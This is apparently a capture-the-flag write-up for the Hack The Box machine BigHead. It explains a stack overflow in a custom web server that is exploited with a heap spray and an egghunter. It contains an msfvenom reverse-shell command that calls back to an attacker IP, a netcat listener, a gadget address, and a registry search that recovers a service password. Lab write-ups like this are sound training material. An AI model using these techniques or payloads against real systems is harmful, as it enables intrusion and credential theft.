## Overview

BigHead is an Insane-difficulty Windows machine built around old-school binary exploitation. The only externally reachable service is nginx, which reverse-proxies several virtual hosts — one of them served by a home-grown HTTP server, `BigheadWebSvr`. Its source and binary leak from the box author's GitHub, and reversing them exposes a classic stack buffer overflow in the HEAD-request handler. With every memory protection disabled, a heap spray plus an egghunter delivers a reverse shell; from there a hex-encoded service password recovered from the registry gives access to the account holding `user.txt`.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80   | nginx 1.14.0 | reverse proxy, multiple vhosts |

Only port 80 is open. nginx routes by Host header, so virtual-host discovery is the first job.

```bash
nmap -sC -sV -p- 10.129.8.42
```

## Enumeration

The site references several vhosts — `bighead.htb`, `code.bighead.htb`, and `dev.bighead.htb`. Add them to `/etc/hosts` and probe each. The `dev` vhost is not served by nginx itself but proxied to a custom backend that announces itself in the `Server` header:

```bash
curl -s -i -H "Host: dev.bighead.htb" http://10.129.8.42/coffee
# HTTP/1.1 418 I'm A Teapot!
# Server: BigheadWebSvr 1.0
```

`BigheadWebSvr 1.0` is not off-the-shelf software. Searching for it leads to the box author's GitHub repository, which contains a password-protected `BHWS_Backup.zip`. An older commit's copy of the archive (password `bighead`) yields the actual server binary and its DLL:

```bash
git clone https://github.com/3mrgnc3/BigheadWebSvr.git
git -C BigheadWebSvr show <old-commit>:BHWS_Backup.zip > bhws.zip
7z x -pbighead bhws.zip        # -> BigheadWebSvr.exe + bHeadSvr.dll
```

## Foothold

Reversing `BigheadWebSvr.exe` shows the HEAD-request branch calling a helper that copies the request path into a fixed 32-byte stack buffer with `strcpy` — no bounds check. The binary and DLL are compiled with no DEP, no ASLR, and no stack canaries, so overwriting the saved return address is straightforward. The server also hex-decodes the path before copying it, which is how binary shellcode is smuggled in as ASCII hex.

The stack buffer is too small for a full payload, so the exploit uses two stages:

1. **Heap spray** — `POST /coffee` requests whose body is the reverse-shell shellcode prefixed with an egg tag (`HTB!HTB!`). The body is gzip-encoded (`Content-Encoding: gzip`) so the nginx proxy forwards the raw bytes intact instead of URL-encoding them.
2. **Trigger** — an oversized HEAD request that overwrites EIP with a `JMP EAX` gadget in `bHeadSvr.dll` (`0x625012F2`). EAX points at a small egghunter stub, which scans process memory for the `HTB!` tag and jumps to the sprayed shellcode.

```bash
# reverse-shell shellcode, bad chars \x00\x0a\x0d
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=4444 -b '\x00\x0a\x0d' -f python

# listener, then fire the spray + egghunter (re-fire until the egghunter finds the shellcode)
nc -lvnp 4444
python3 bighead_bof.py
```

A few rounds later the egghunter locates the payload and a shell returns as `piedpiper\nelson` on the host `PiedPiper` (Windows Server 2008).

## User flag

The `user.txt` file belongs to the `nginx` service account, not `nelson`. That account's password is stored — hex-encoded and UTF-16, but not encrypted — in the registry under the nginx service key, recoverable with a simple search and a quick decode:

```bash
reg query HKLM /f Password /t REG_SZ /s
echo <hexblob> | sed s/00//g | xxd -p -r        # -> cleartext password
```

With those credentials the user flag is read from the `nginx` user's desktop:

```bash
type C:\Users\nginx\Desktop\user.txt   # HTB{...}
```
